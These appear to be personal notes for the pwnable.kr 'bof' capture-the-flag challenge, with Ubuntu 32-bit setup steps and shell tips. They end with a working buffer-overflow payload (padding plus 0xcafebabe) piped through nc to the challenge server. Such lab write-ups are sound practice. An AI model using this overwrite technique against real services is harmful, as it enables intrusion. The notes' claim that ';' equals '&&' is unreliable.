#### 1.Ubuntu 64 run 32bit :1.Ubuntu 64 run 32bit :
To run a 32-bit executable file on a 64-bit multi-architecture Ubuntu system, you have to add the i386 architecture and install the three library packages libc6:i386, libncurses5:i386, and libstdc++6:i386:

sudo dpkg --add-architecture i386
Or if you are using Ubuntu 12.04 LTS (Precise Pangolin) or below, use this:

echo "foreign-architecture i386" > /etc/dpkg/dpkg.cfg.d/multiarch
Then:

sudo apt-get update
sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386
If fails, do also

sudo apt-get install multiarch-support
After these steps, you should be able to run the 32-bit application:

./example32bitprogram

#### 2. linux cmd
cat - :作为标准输入
| ： 前一个命令的参数作为当前命令的参数
;  ==  &&
#### 3 注意64位和32位堆栈问题
#### 4.peda: pattern
#### 5.key: 
```
(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1\xbe\xba\xfe\xca"' ;cat -) | nc pwnable.kr 9000
(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1\xbe\xba\xfe\xca"' &&cat -) | nc pwnable.kr 9000
```